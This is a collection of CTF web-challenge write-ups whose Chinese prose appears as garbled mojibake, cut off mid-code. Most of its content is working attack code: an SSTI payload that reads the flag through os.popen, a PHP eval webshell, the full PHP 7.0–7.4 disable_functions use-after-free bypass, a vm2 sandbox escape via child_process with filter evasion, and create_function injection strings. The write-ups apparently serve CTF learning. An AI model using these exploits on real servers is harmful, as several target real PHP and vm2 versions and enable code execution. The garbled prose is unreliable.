å°†GETå‚æ•°è¿›è¡Œæ–‡ä»¶åŒ…å«\n\næ„é€ pythonè„šæœ¬\n\n```python\nimport requests\nurl = \"http://eecf8a4a-cb71-40a6-9ff8-6e21849084dd.node4.buuoj.cn:81/flflflflag.php?file=php://filter/string.strip_tags/resource=/etc/passwd\"\nphpfile = \"<?php phpinfo(); ?>\"\nfiledata = {\n    \"file\":phpfile\n}\nbak = requests.post(url=url, files=filedata)\nprint(bak.text)\n```\n\næ­¤æ—¶å®ä¾‹å´©æºƒé‡å¯ï¼Œä½†æ˜¯/tmpä¸­çš„å†…å®¹ä¾ç„¶ä¿å­˜ï¼Œè®¿é—®dir.phpï¼ˆç›®å½•æ‰«ææ‰«å‡ºæ¥çš„ï¼‰æŸ¥çœ‹tmpä¸­çš„å†…å®¹ï¼Œå‘ç°åˆšä¸Šä¼ çš„æ–‡ä»¶ï¼Œä½¿ç”¨includeåŒ…å«åæœç´¢flagæ‹¿åˆ°flag\n\n## [CISCN2019 åä¸œå—èµ›åŒº]Double Secret\n\nè¿›å»è®¿é—®/secret\n\n```\nTell me your secret.I will encrypt it so others can't see\n```\n\nä¼ å‚æ•°secretï¼Œè¾“ç‚¹ä¹±ä¸ƒå…«ç³Ÿçš„è®©å®ƒæŠ¥é”™ï¼Œçœ‹æºç \n\n```python\n    if(secret==None):\n        return 'Tell me your secret.I will encrypt it so others can\\'t see'\n    rc=rc4_Modified.RC4(\"HereIsTreasure\")   #è§£å¯†\n    deS=rc.do_crypt(secret)\n    a=render_template_string(safe(deS))\n    if 'ciscn' in a.lower():\n        return 'flag detected!'\n    return a\n```\n\nå°±æ˜¯å¯¹ä¼ å…¥çš„secretè¿›è¡ŒRC4ç¼–ç åå†æ¨¡ç‰ˆæ¸²æŸ“\n\nå·ä¸€ä¸ªå¸ˆå‚…çš„è„šæœ¬\n\n```python\nimport base64\nfrom urllib.parse import quote\ndef rc4_main(key = \"init_key\", message = \"init_message\"):\n    # print(\"RC4åŠ å¯†ä¸»å‡½æ•°\")\n    s_box = rc4_init_sbox(key)\n    crypt = str(rc4_excrypt(message, s_box))\n    return  crypt\ndef rc4_init_sbox(key):\n    s_box = list(range(256))\n    # print(\"åŸæ¥çš„ s ç›’ï¼š%s\" % s_box)\n    j = 0\n    for i in range(256):\n        j = (j + s_box[i] + ord(key[i % len(key)])) % 256\n        s_box[i], s_box[j] = s_box[j], s_box[i]\n    # print(\"æ··ä¹±åçš„ s ç›’ï¼š%s\"% s_box)\n    return s_box\ndef rc4_excrypt(plain, box):\n    # print(\"è°ƒç”¨åŠ å¯†ç¨‹åºæˆåŠŸã€‚\")\n    res = []\n    i = j = 0\n    for s in plain:\n        i = (i + 1) % 256\n        j = (j + box[i]) % 256\n        box[i], box[j] = box[j], box[i]\n        t = (box[i] + box[j]) % 256\n        k = box[t]\n        res.append(chr(ord(s) ^ k))\n    cipher = \"\".join(res)\n    print(\"%s\" %quote(cipher))\n    return (str(base64.b64encode(cipher.encode('utf-8')), 'utf-8'))\nrc4_main(\"HereIsTreasure\",\"{{lipsum.__globals__.__builtins__.eval(\\\"__import__('os').popen('cat /flag.txt').read()\\\")}}\")\n```\n\nä¼ å…¥å–µå–µå–µ\n\n## [GYCTF2020]EasyThinking\n\nçœ‹è¿™ä¸ªé¢˜ç›®æ€•ä¸æ˜¯ThinkPHPï¼Œéšä¾¿æä¸€ä¸ªä¸å­˜åœ¨çš„ç›®å½•ï¼Œå‘ç°ç¡®å®æ˜¯ThinkPHP V6.0çš„ä¸€ä¸ªsessionå¤„ä»»æ„æ–‡ä»¶å†™å…¥æ¼æ´\n\n> å¤§æ¦‚å°±æ˜¯åœ¨./runtime/session/ç›®å½•ä¸‹å†™å…¥ä¸€ä¸ªåä¸ºsess_SESSIONIDçš„æ–‡ä»¶ï¼Œå†…å®¹æ˜¯ä¼ å…¥çš„å‚æ•°å†…å®¹\n\né‚£ä¹ˆåœ¨æœç´¢å¤„æ„é€ æœ¨é©¬`<?php eval($_POST[a]);?>`\n\nç„¶åè®¿é—®`/runtime/session/sess_d62297dbd2f3523b5b66a5036c3f.php`\n\nbanäº†ä¸€å †å‡½æ•°ï¼Œæ‰¾`disable_functions`ç»•è¿‡poc\n\n```php\n<?php\n\n# PHP 7.0-7.4 disable_functions bypass PoC (*nix only)\n#\n# Bug: https://bugs.php.net/bug.php?id=76047\n# debug_backtrace() returns a reference to a variable \n# that has been destroyed, causing a UAF vulnerability.\n#\n# This exploit should work on all PHP 7.0-7.4 versions\n# released as of 30/01/2020.\n#\n# Author: https://github.com/mm0r1\n\npwn(\"ls /\");\n\nfunction pwn($cmd) {\n    global $abc, $helper, $backtrace;\n\n    class Vuln {\n        public $a;\n        public function __destruct() { \n            global $backtrace; \n            unset($this->a);\n            $backtrace = (new Exception)->getTrace(); # ;)\n            if(!isset($backtrace[1]['args'])) { # PHP >= 7.4\n                $backtrace = debug_backtrace();\n            }\n        }\n    }\n\n    class Helper {\n        public $a, $b, $c, $d;\n    }\n\n    function str2ptr(&$str, $p = 0, $s = 8) {\n        $address = 0;\n        for($j = $s-1; $j >= 0; $j--) {\n            $address <<= 8;\n            $address |= ord($str[$p+$j]);\n        }\n        return $address;\n    }\n\n    function ptr2str($ptr, $m = 8) {\n        $out = \"\";\n        for ($i=0; $i < $m; $i++) {\n            $out .= chr($ptr & 0xff);\n            $ptr >>= 8;\n        }\n        return $out;\n    }\n\n    function write(&$str, $p, $v, $n = 8) {\n        $i = 0;\n        for($i = 0; $i < $n; $i++) {\n            $str[$p + $i] = chr($v & 0xff);\n            $v >>= 8;\n        }\n    }\n\n    function leak($addr, $p = 0, $s = 8) {\n        global $abc, $helper;\n        write($abc, 0x68, $addr + $p - 0x10);\n        $leak = strlen($helper->a);\n        if($s != 8) { $leak %= 2 << ($s * 8) - 1; }\n        return $leak;\n    }\n\n    function parse_elf($base) {\n        $e_type = leak($base, 0x10, 2);\n\n        $e_phoff = leak($base, 0x20);\n        $e_phentsize = leak($base, 0x36, 2);\n        $e_phnum = leak($base, 0x38, 2);\n\n        for($i = 0; $i < $e_phnum; $i++) {\n            $header = $base + $e_phoff + $i * $e_phentsize;\n            $p_type  = leak($header, 0, 4);\n            $p_flags = leak($header, 4, 4);\n            $p_vaddr = leak($header, 0x10);\n            $p_memsz = leak($header, 0x28);\n\n            if($p_type == 1 && $p_flags == 6) { # PT_LOAD, PF_Read_Write\n                # handle pie\n                $data_addr = $e_type == 2 ? $p_vaddr : $base + $p_vaddr;\n                $data_size = $p_memsz;\n            } else if($p_type == 1 && $p_flags == 5) { # PT_LOAD, PF_Read_exec\n                $text_size = $p_memsz;\n            }\n        }\n\n        if(!$data_addr || !$text_size || !$data_size)\n            return false;\n\n        return [$data_addr, $text_size, $data_size];\n    }\n\n    function get_basic_funcs($base, $elf) {\n        list($data_addr, $text_size, $data_size) = $elf;\n        for($i = 0; $i < $data_size / 8; $i++) {\n            $leak = leak($data_addr, $i * 8);\n            if($leak - $base > 0 && $leak - $base < $data_addr - $base) {\n                $deref = leak($leak);\n                # 'constant' constant check\n                if($deref != 0x746e6174736e6f63)\n                    continue;\n            } else continue;\n\n            $leak = leak($data_addr, ($i + 4) * 8);\n            if($leak - $base > 0 && $leak - $base < $data_addr - $base) {\n                $deref = leak($leak);\n                # 'bin2hex' constant check\n                if($deref != 0x786568326e6962)\n                    continue;\n            } else continue;\n\n            return $data_addr + $i * 8;\n        }\n    }\n\n    function get_binary_base($binary_leak) {\n        $base = 0;\n        $start = $binary_leak & 0xfffffffffffff000;\n        for($i = 0; $i < 0x1000; $i++) {\n            $addr = $start - 0x1000 * $i;\n            $leak = leak($addr, 0, 7);\n            if($leak == 0x10102464c457f) { # ELF header\n                return $addr;\n            }\n        }\n    }\n\n    function get_system($basic_funcs) {\n        $addr = $basic_funcs;\n        do {\n            $f_entry = leak($addr);\n            $f_name = leak($f_entry, 0, 6);\n\n            if($f_name == 0x6d6574737973) { # system\n                return leak($addr + 8);\n            }\n            $addr += 0x20;\n        } while($f_entry != 0);\n        return false;\n    }\n\n    function trigger_uaf($arg) {\n        # str_shuffle prevents opcache string interning\n        $arg = str_shuffle(str_repeat('A', 79));\n        $vuln = new Vuln();\n        $vuln->a = $arg;\n    }\n\n    if(stristr(PHP_OS, 'WIN')) {\n        die('This PoC is for *nix systems only.');\n    }\n\n    $n_alloc = 10; # increase this value if UAF fails\n    $contiguous = [];\n    for($i = 0; $i < $n_alloc; $i++)\n        $contiguous[] = str_shuffle(str_repeat('A', 79));\n\n    trigger_uaf('x');\n    $abc = $backtrace[1]['args'][0];\n\n    $helper = new Helper;\n    $helper->b = function ($x) { };\n\n    if(strlen($abc) == 79 || strlen($abc) == 0) {\n        die(\"UAF failed\");\n    }\n\n    # leaks\n    $closure_handlers = str2ptr($abc, 0);\n    $php_heap = str2ptr($abc, 0x58);\n    $abc_addr = $php_heap - 0xc8;\n\n    # fake value\n    write($abc, 0x60, 2);\n    write($abc, 0x70, 6);\n\n    # fake reference\n    write($abc, 0x10, $abc_addr + 0x60);\n    write($abc, 0x18, 0xa);\n\n    $closure_obj = str2ptr($abc, 0x20);\n\n    $binary_leak = leak($closure_handlers, 8);\n    if(!($base = get_binary_base($binary_leak))) {\n        die(\"Couldn't determine binary base address\");\n    }\n\n    if(!($elf = parse_elf($base))) {\n        die(\"Couldn't parse ELF header\");\n    }\n\n    if(!($basic_funcs = get_basic_funcs($base, $elf))) {\n        die(\"Couldn't get basic_functions address\");\n    }\n\n    if(!($zif_system = get_system($basic_funcs))) {\n        die(\"Couldn't get zif_system address\");\n    }\n\n    # fake closure object\n    $fake_obj_offset = 0xd0;\n    for($i = 0; $i < 0x110; $i += 8) {\n        write($abc, $fake_obj_offset + $i, leak($closure_obj, $i));\n    }\n\n    # pwn\n    write($abc, 0x20, $abc_addr + $fake_obj_offset);\n    write($abc, 0xd0 + 0x38, 1, 4); # internal func type\n    write($abc, 0xd0 + 0x68, $zif_system); # internal func handler\n\n    ($helper->b)($cmd);\n    exit();\n}\n?>\n```\n\næŠŠå‘½ä»¤æ”¹ä¸º/readflagå¹¶ä¸”ä½¿ç”¨èšå‰‘æŠŠpocä¸Šä¼ å¹¶è®¿é—®ï¼ŒæˆåŠŸæ‹¿åˆ°flag\n\n## [HFCTF2020]JustEscape\n\né¦–é¡µæç¤ºäº†å¯èƒ½ä¸æ˜¯phpå“¦\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/æˆªå±2022-05-10 01.09.27.png)\n\nçœ‹wpè¯´æ˜¯node.js~~æœ¬äººå®Œå…¨æ²¡æœ‰æ¥è§¦è¿‡~~\n\næµ‹è¯•ä½¿ç”¨Error().stackå‡½æ•°ï¼Œå‘ç°ç¡®å®æ˜¯node.jsï¼Œæ˜¯VM2æ²™ç®±é€ƒé€¸ï¼Œ[ç°æˆpoc](https://github.com/patriksimek/vm2/issues/225)ç›´æ¥ä½¿ç”¨\n\n```js\n\"use strict\";\nconst {VM} = require('vm2');\nconst untrusted = '(' + function(){\n    TypeError[`${`${`prototyp`}e`}`].get_process = f=>f.constructor(\"return process\")();\n    try{\n        Object.preventExtensions(Buffer.from(\"\")).a = 1;\n    }catch(e){\n        return e.get_process(()=>{}).mainModule.require(\"child_process\").execSync(\"whoami\").toString();\n    }\n}+')()';\ntry{\n    console.log(new VM().run(untrusted));\n}catch(x){\n    console.log(x);\n}\n```\n\nä½†æ˜¯è¿™é¢˜æœ‰å…³é”®å­—è¿‡æ»¤ï¼Œåœ¨è¿™ä½¿ç”¨javascriptçš„æ¨¡ç‰ˆæ–‡å­—ç»•è¿‡ï¼Œå¦‚\n\n```\nprototypeå˜æˆ`${`${`prototyp`}e`}`\n```\n\næœ€ç»ˆpayload\n\n```js\n(function (){\n    TypeError[`${`${`prototyp`}e`}`][`${`${`get_proces`}s`}`] = f=>f[`${`${`constructo`}r`}`](`${`${`return this.proces`}s`}`)();\n    try{\n        Object.preventExtensions(Buffer.from(``)).a = 1;\n    }catch(e){\n        return e[`${`${`get_proces`}s`}`](()=>{}).mainModule[`${`${`requir`}e`}`](`${`${`child_proces`}s`}`)[`${`${`exe`}cSync`}`](`cat /flag`).toString();\n    }\n})()\n```\n\n## [BJDCTF2020]EzPHP\n\nçœ‹æºç ï¼Œbase32è§£ç åè®¿é—®\n\n```php\n<?php\nhighlight_file(__FILE__);\nerror_reporting(0); \n\n$file = \"1nD3x.php\";\n$shana = $_GET['shana'];\n$passwd = $_GET['passwd'];\n$arg = '';\n$code = '';\n\necho \"<br /><font color=red><B>This is a very simple challenge and if you solve it I will give you a flag. Good Luck!</B><br></font>\";\n\nif($_SERVER) { \n    if (\n        preg_match('/shana|debu|aqua|cute|arg|code|flag|system|exec|passwd|ass|eval|sort|shell|ob|start|mail|\\$|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|read|inc|info|bin|hex|oct|echo|print|pi|\\.|\\\"|\\'|log/i', $_SERVER['QUERY_STRING'])\n        )  \n        die('You seem to want to do something bad?'); \n}\n\nif (!preg_match('/http|https/i', $_GET['file'])) {\n    if (preg_match('/^aqua_is_cute$/', $_GET['debu']) && $_GET['debu'] !== 'aqua_is_cute') { \n        $file = $_GET[\"file\"]; \n        echo \"Neeeeee! Good Job!<br>\";\n    } \n} else die('fxck you! What do you want to do ?!');\n\nif($_REQUEST) { \n    foreach($_REQUEST as $value) { \n        if(preg_match('/[a-zA-Z]/i', $value))  \n            die('fxck you! I hate English!'); \n    } \n} \n\nif (file_get_contents($file) !== 'debu_debu_aqua')\n    die(\"Aqua is the cutest five-year-old child in the world! Isn't it ?<br>\");\n\n\nif ( sha1($shana) === sha1($passwd) && $shana != $passwd ){\n    extract($_GET[\"flag\"]);\n    echo \"Very good! you know my password. But what is flag?<br>\";\n} else{\n    die(\"fxck you! you don't know my password! And you don't know sha1! why you come here!\");\n}\n\nif(preg_match('/^[a-z0-9]*$/isD', $code) || \npreg_match('/fil|cat|more|tail|tac|less|head|nl|tailf|ass|eval|sort|shell|ob|start|mail|\\`|\\{|\\%|x|\\&|\\$|\\*|\\||\\<|\\\"|\\'|\\=|\\?|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|print|echo|read|inc|flag|1f|info|bin|hex|oct|pi|con|rot|input|\\.|log|\\^/i', $arg) ) { \n    die(\"<br />Neeeeee~! I have disabled all dangerous functions! You can't get my flag =w=\"); \n} else { \n    include \"flag.php\";\n    $code('', $arg); \n} ?>\nThis is a very simple challenge and if you solve it I will give you a flag. Good Luck!\nAqua is the cutest five-year-old child in the world! Isn't it ?\n```\n\nå°±æ˜¯ç»•å‘—\n\n**P1**\n\n`$_SERVER[\"QUERY_STRING\"] `ä¸­æ˜¯?åçš„å†…å®¹ï¼Œåœ¨ç›´æ¥è¯»å–æ—¶å¹¶ä¸ä¼šè¿›è¡Œurlè§£ç ï¼Œä½†æ˜¯åœ¨ä½¿ç”¨$_GETè®¿é—®æŸä¸€å‚æ•°çš„æ—¶å€™ä¼šè¿›è¡ŒURLè§£ç ï¼Œåœ¨è¿™é‡Œæˆ‘ä»¬åªéœ€è¦å¯¹å†…å®¹è¿›è¡ŒURLç¼–ç å³å¯\n\n**P2**\n\næ¢è¡Œç»•è¿‡\n\n**P3**\n\nåœ¨`$_REQUEST`ä¸­ï¼ŒPOSTçš„ä¼˜å…ˆçº§å¤§äºGETä¼ å…¥çš„å‚é‡ï¼Œæ‰€ä»¥æˆ‘ä»¬å†åœ¨POSTä¸­é‡æ–°ä¼ ä¸€æ¬¡åŒåå‚é‡å°±è¡Œ\n\n**P4**\n\nä¼ªåè®®ç»•è¿‡ï¼Œè®°å¾—URLç¼–ç \n\n**P5**\n\nSHA1å¼ºæ¯”è¾ƒç»•è¿‡ï¼Œç±»ä¼¼md5ï¼Œç”¨æ•°ç»„å³å¯\n\n**P6**\n\næ–°çŸ¥è¯†ï¼šcreate_function()\n\n> create_function()æ³¨å…¥åŸç†ï¼š\n>\n> create_function()å‡½æ•°æœ‰ä¸¤ä¸ªå‚æ•°`$args`å’Œ`$code`ï¼Œç”¨äºåˆ›å»ºä¸€ä¸ªlambdaæ ·å¼çš„å‡½æ•°ï¼Œé¦–å…ˆå¯ä»¥ç”¨create_function()åˆ›å»ºä¸€ä¸ªç®€å•å‡½æ•°\n\n```php\n<?php\n$afunc = create_function('$a, $b','return ($a+$b);');\necho $afunc(1,2);\n//è¾“å‡º3\n?>\n```\n\n> è€Œæœ¬é¢˜çš„$code('', $arg); //æ­¤å¤„å­˜åœ¨create_function()æ³¨å…¥ä¸­å¯ä»¥é€šè¿‡æ§åˆ¶$argæ¥è¿›è¡Œä»£ç æ³¨å…¥\n> é¦–å…ˆä¿è¯ä¼ å…¥çš„$codeä¸ºcreate_funtionï¼Œ\n> å…¶æ¬¡æ˜¯$argå‚æ•°ï¼Œæœ¬é¢˜ä¸­è¿‡æ»¤äº†catã€flagã€scanç­‰å…³é”®å­—ï¼Œæ— æ³•ç›´æ¥å‘½ä»¤æ‰§è¡Œå¾—åˆ°flagçš„å€¼ï¼Œåœ¨ç½‘ä¸ŠæŸ¥é˜…åæ‰¾åˆ°äº†åˆé€‚çš„å‡½æ•°get_defined_vars()ç›´æ¥è¾“å‡ºæ‰€æœ‰å˜é‡ï¼Œæ„é€ payloadå¦‚ä¸‹\n\n```\nfl%61g[c%6fde]=create_function&fl%61g[%61rg]=}var_dump(get_defined_vars());//\n```\n\nç„¶é¹…è¿˜æ˜¯æ‹¿ä¸åˆ°flagï¼Œæç¤ºflagåœ¨`rea1fl4g.php`ä¸­ï¼Œè®¿é—®å‘ç°æ‹¿ä¸åˆ°ï¼Œåº”è¯¥æ˜¯ä»¥å˜é‡å½¢å¼æ”¾è¿›å»äº†ï¼Œé‚£ä¹ˆå°è¯•åŒ…å«è¿™ä¸ªæ–‡ä»¶å¹¶å°†æ‰€æœ‰å˜é‡æ‰“å°å‡ºæ¥åº”è¯¥å°±è¡Œäº†ï¼Œincludeå‡½æ•°è¢«banï¼Œå°è¯•requireåŠ base64ç¼–ç \n\n```\nfl%61g[%61rg]=}require(base64_dec%6fde(cmVhMWZsNGcucGhw));var_dump(get_defined_vars());//\n```\n\nç»™äº†ä¸ªå‡çš„flagğŸ˜…ï¼Œè¯»æºç \n\n```\nrequire(php://filter/read=convert.base64-encode/resource=rea1fl4g.php);\næ»¤çš„å¤ªå¤šäº†èµ°å–åç»•è¿‡å§\nfl%61g[%61rg]=}require(~(%8F%97%8F%C5%D0%D0%99%96%93%8B%9A%8D%D0%8D%9A%9E%9B%C2%9C%90%91%89%9A%8D%8B%D1%9D%9E%8C%9A%C9%CB%D2%9A%91%9C%90%9B%9A%D0%8D%9A%8C%90%8A%8D%9C%9A%C2%8D%9A%9E%CE%99%93%CB%98%D1%8F%97%8F));//\n```\n\n```\n\t$f4ke_flag = \"BJD{1am_a_fake_f41111g23333}\";\n\t$rea1_f1114g = \"flag{4821ec92-8b00-4b72-b98c-4a7a296d9073}\";\n\tunset($rea1_f1114g);\nunsetå°±ç¦»è°±ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼\n```\n\n## [GXYCTF2019]StrongestMind\n\n```python\nimport requests\nimport re\nimport time\nurl=\"http://3dd7fedb-f52b-4054-a53e-07ea193a2b99.node4.buuoj.cn:81/index.php\"\ncookie={\"PHPSESSID\":\"f564584a331647033d332274c6bc3eb5\"}\ntes=requests.get(url=url,cookies=cookie).text\ni=re.findall(r\"\\d+\\s[\\/|\\+|\\*|-]\\s\\d+\",tes)\nprint(tes)\nfor j in range(1,2000):\n    data={'answer':f\"{eval(i[0])}\"}\n    tes=requests.post(url=url,cookies=cookie,data=data).text\n    i = re.findall(r\"\\d+\\s[\\/|\\+|\\*|-]\\s\\d+\", tes)\n    if \"flag{\" in tes:\n        print(tes)\n    else:\n        try:\n            print(re.findall(r'Ã§Â¬Â¬ \\d+ Ã¦Â¬',tes)[0])\n        except:\n            print()\n    time.sleep(0.1)\n```\n\næ²¡äº†\n\n## [MRCTF2020]Ezaudit\n\nwww.zipæ‹¿æºç \n\n```php\n<?php \nheader('Content-type:text/html; charset=utf-8');\nerror_reporting(0);\nif(isset($_POST['login'])){\n    $username = $_POST['username'];\n    $password = $_POST['password'];\n    $Private_key = $_POST['Private_key'];\n    if (($username == '') || ($password == '') ||($Private_key == '')) {\n        // è‹¥ä¸ºç©º,è§†ä¸ºæœªå¡«å†™,æç¤ºé”™è¯¯,å¹¶3ç§’åè¿”å›ç™»å½•ç•Œé¢\n        header('refresh:2; url=login.html');\n        echo \"ç”¨æˆ·åã€å¯†ç ã€å¯†é’¥ä¸èƒ½ä¸ºç©ºå•¦,crisprä¼šè®©ä½ åœ¨2ç§’åè·³è½¬åˆ°ç™»å½•ç•Œé¢çš„!\";\n        exit;\n}\n    else if($Private_key != '*************' )\n    {\n        header('refresh:2; url=login.html');\n        echo \"å‡å¯†é’¥ï¼Œå’‹ä¼šè®©ä½ ç™»å½•?crisprä¼šè®©ä½ åœ¨2ç§’åè·³è½¬åˆ°ç™»å½•ç•Œé¢çš„!\";\n        exit;\n    }\n\n    else{\n        if($Private_key === '************'){\n        $getuser = \"SELECT flag FROM user WHERE username= 'crispr' AND password = '$password'\".';'; \n        $link=mysql_connect(\"localhost\",\"root\",\"root\");\n        mysql_select_db(\"test\",$link);\n        $result = mysql_query($getuser);\n        while($row=mysql_fetch_assoc($result)){\n            echo \"<tr><td>\".$row[\"username\"].\"</td><td>\".$row[\"flag\"].\"</td><td>\";\n        }\n    }\n    }\n\n} \n// genarate public_key \nfunction public_key($length = 16) {\n    $strings1 = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';\n    $public_key = '';\n    for ( $i = 0; $i < $length; $i++ )\n    $public_key .= substr($strings1, mt_rand(0, strlen($strings1) - 1), 1);\n    return $public_key;\n  }\n\n  //genarate private_key\n  function private_key($length = 12) {\n    $strings2 = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';\n    $private_key = '';\n    for ( $i = 0; $i < $length; $i++ )\n    $private_key .= substr($strings2, mt_rand(0, strlen($strings2) - 1), 1);\n    return $private_key;\n  }\n  $Public_key = public_key();\n  //$Public_key = KVQP0LdJKRaV3n9D  how to get crispr's private_key???\n\n```\n\nçˆ†ç ´ç§å­\n\n```python\ns = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'\nkey = 'KVQP0LdJKRaV3n9D'\nm = ''\nfor i in key:\n    for j in range(len(s)):\n        if i == s[j]:\n            m += \"{} {} 0 {} \".format(j,j,len(s)-1)\nprint(m)\n```\n\nçˆ†ç ´å‡ºç§å­ä¸º1775196155ï¼ŒæœåŠ¡å™¨PHPç‰ˆæœ¬ä¸º5.6.40ï¼Œçˆ†å‡ºprivate_keyï¼ŒadminåŠ ä¸‡èƒ½å¯†ç å³å¯\n\n## [SUCTF 2018]GetShell\n\n```php\nif($contents=file_get_contents($_FILES[\"file\"][\"tmp_name\"])){\n    $data=substr($contents,5);\n    foreach ($black_char as $b) {\n        if (stripos($data, $b) !== false){\n            die(\"illegal char\");\n        }\n    }     \n} \n```\n\né»‘åå•è¿‡æ»¤æµ‹è¯•åå‘ç°æ»¤æ‰äº†æ‰€æœ‰æ•°å­—å’Œå­—æ¯ï¼Œç”¨å–åæˆ–å¼‚æˆ–ç»•è¿‡\n\n```php\n$_=[];             //array\n$__=$_.$_;         //arrayarray \n$__=($_==$_); \t\t //trueï¼Œç»“æœä¸º1\necho ~'èŒ‰'[$__];\t//s\necho ~'å†…'[$__];\t//y\necho ~'èŒ‰'[$__];\t//s\necho ~'è‹'[$__];\t//t\necho ~'çš„'[$__];\t//e\necho ~'å’©'[$__];\t//m\necho ~'è¯¾'[$__];\t//P\necho ~'å°¬'[$__];\t//O\necho ~'ç¬”'[$__];\t//S\necho ~'ç«¯'[$__];\t//T\necho ~'ç'[$__];\t//a\n```\n\nåœ¨è¿™é‡Œå¯ä»¥è¿™ä¹ˆä½¿ç”¨æ˜¯å› ä¸ºUTF-8ç¼–ç åœ¨ç¼–ç æ±‰å­—æ—¶å®é™…ä¸Šæ˜¯ä½¿ç”¨äº†ä¸‰ä¸ªå•å­—ç¬¦æ‹¼æ¥ç¼–ç çš„ï¼Œä½¿ç”¨[]å³å¯å–å‡ºä¸­é—´çš„ä¸€ä¸ªå­—ç¬¦ï¼Œå†å¯¹è¿™ä¸ªå­—ç¬¦è¿›è¡Œå–åæ“ä½œï¼Œå°±å¯èƒ½èƒ½æ‰“å°å‡ºæˆ‘ä»¬æƒ³è¦çš„å­—ç¬¦\n\næœ€ç»ˆpayloadï¼š\n\n```php\n<?=$_=[];$__.=$_;$____=$_==$_;$___=~èŒ‰[$____];$___.=~å†…[$____];$___.=~èŒ‰[$____];$___.=~è‹[$____];$___.=~çš„[$____];$___.=~å’©[$____];$_____=_;$_____.=~è¯¾[$____];$_____.=~å°¬[$____];$_____.=~ç¬”[$____];$_____.=~ç«¯[$____];$__________=$$_____;$___($__________[~ç[$____]]);\n```\n\n## [GYCTF2020]Easyphp\n\nååºåˆ—åŒ–ï¼Œwww.zipæ‹¿æºç \n\n```php\n//lib.php\n<?php\nerror_reporting(0);\nsession_start();\nfunction safe($parm){\n    $array= array('union','regexp','load','into','flag','file','insert',\"'\",'\\\\',\"*\",\"alter\");\n    return str_replace($array,'hacker',$parm);\n}\nclass User\n{\n    public $id;\n    public $age=null;\n    public $nickname=null;\n    public function login() {\n        if(isset($_POST['username'])&&isset($_POST['password'])){\n        $mysqli=new dbCtrl();\n        $this->id=$mysqli->login('select id,password from user where username=?');\n        if($this->id){\n        $_SESSION['id']=$this->id;\n        $_SESSION['login']=1;\n        echo \"ä½ çš„IDæ˜¯\".$_SESSION['id'];\n        echo \"ä½ å¥½ï¼\".$_SESSION['token'];\n        echo \"<script>window.location.href='./update.php'</script>\";\n        return $this->id;\n        }\n    }\n}\n    public function update(){\n        $Info=unserialize($this->getNewinfo());\n        $age=$Info->age;\n        $nickname=$Info->nickname;\n        $updateAction=new UpdateHelper($_SESSION['id'],$Info,\"update user SET age=$age,nickname=$nickname where id=\".$_SESSION['id']);\n        //è¿™ä¸ªåŠŸèƒ½è¿˜æ²¡æœ‰å†™å®Œ å…ˆå å‘\n    }\n    public function getNewInfo(){\n        $age=$_POST['age'];\n        $nickname=$_POST['nickname'];\n        return safe(serialize(new Info($age,$nickname)));\n    }\n    public function __destruct(){\n        return file_get_contents($this->nickname);//å±\n    }\n    public function __toString()\n    {\n        $this->nickname->update($this->age);\n        return \"0-0\";\n    }\n}\nclass Info{\n    public $age;\n    public $nickname;\n    public $CtrlCase;\n    public function __construct($age,$nickname){\n        $this->age=$age;\n        $this->nickname=$nickname;\n    }\n    public function __call($name,$argument){\n        echo $this->CtrlCase->login($argument[0]);\n    }\n}\nClass UpdateHelper{\n    public $id;\n    public $newinfo;\n    public $sql;\n    public function __construct($newInfo,$sql){\n        $newInfo=unserialize($newInfo);\n        $upDate=new dbCtrl();\n    }\n    public function __destruct()\n    {\n        echo $this->sql;\n    }\n}\nclass dbCtrl\n{\n    public $hostname=\"127.0.0.1\";\n    public $dbuser=\"root\";\n    public $dbpass=\"root\";\n    public $database=\"test\";\n    public $name;\n    public $password;\n    public $mysqli;\n    public $token;\n    public function __construct()\n    {\n        $this->name=$_POST['username'];\n        $this->password=$_POST['password'];\n        $this->token=$_SESSION['token'];\n    }\n    public function login($sql)\n    {\n        $this->mysqli=new mysqli($this->hostname, $this->dbuser, $this->dbpass, $this->database);\n        if ($this->mysqli->connect_error) {\n            die(\"è¿æ¥å¤±è´¥ï¼Œé”™è¯¯:\" . $this->mysqli->connect_error);\n        }\n        $result=$this->mysqli->prepare($sql);\n        $result->bind_param('s', $this->name);\n        $result->execute();\n        $result->bind_result($idResult, $passwordResult);\n        $result->fetch();\n        $result->close();\n        if ($this->token=='admin') {\n            return $idResult;\n        }\n        if (!$idResult) {\n            echo('ç”¨æˆ·ä¸å­˜åœ¨!');\n            return false;\n        }\n        if (md5($this->password)!==$passwordResult) {\n            echo('å¯†ç é”™è¯¯ï¼');\n            return false;\n        }\n        $_SESSION['token']=$this->name;\n        return $idResult;\n    }\n    public function update($sql)\n    {\n        //è¿˜æ²¡æ¥å¾—åŠå†™\n    }\n}\n\n```\n\n\n\n```php\n//update.php\n<?php\nrequire_once('lib.php');\necho '<html>\n<meta charset=\"utf-8\">\n<title>update</title>\n<h2>è¿™æ˜¯ä¸€ä¸ªæœªå®Œæˆçš„é¡µé¢ï¼Œä¸Šçº¿æ—¶å»ºè®®åˆ é™¤æœ¬é¡µé¢</h2>\n</html>';\nif ($_SESSION['login']!=1){\n\techo \"ä½ è¿˜æ²¡æœ‰ç™»é™†å‘¢ï¼\";\n}\n$users=new User();\n$users->update();\nif($_SESSION['login']===1){\n\trequire_once(\"flag.php\");\n\techo $flag;\n}\n?>\n```\n\nå¯ä»¥çœ‹åˆ°update.phpä¸­ä¸è®ºsessionçš„åˆ¤æ–­ç»“æœå¦‚ä½•éƒ½ä¼šæ‰§è¡Œç±»ä¸­updateæ–¹æ³•ï¼Œå¹¶ä¸”å¦‚æœæƒ³è·å–flagå°±éœ€è¦è®©`$_SESSION['login']===1`æˆ–è€…`$_SESSION['token']==='admin'`\n\n```PHP\nclass dbCtrl{    \n    public function login($sql)\n    {\n        $this->mysqli=new mysqli($this->hostname, $this->dbuser, $this->dbpass, $this->database);\n        if ($this->mysqli->connect_error) 